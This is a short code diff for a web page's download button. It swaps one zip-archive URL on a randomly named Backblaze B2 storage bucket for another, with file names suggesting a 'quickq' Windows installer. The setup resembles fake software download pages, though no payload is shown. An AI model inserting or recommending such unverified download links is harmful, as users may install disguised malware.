@@ -13,5 +13,5 @@
 })();
 
 function btnDown() {
-    window.open('https://jasgsdhnayutjzg.s3.us-east-005.backblazeb2.com/win-Qquickqersegh.zip')
+    window.open('https://jasgsdhnayutjzg.s3.us-east-005.backblazeb2.com/lyueir-quickq8.01.9.zip')
                 }
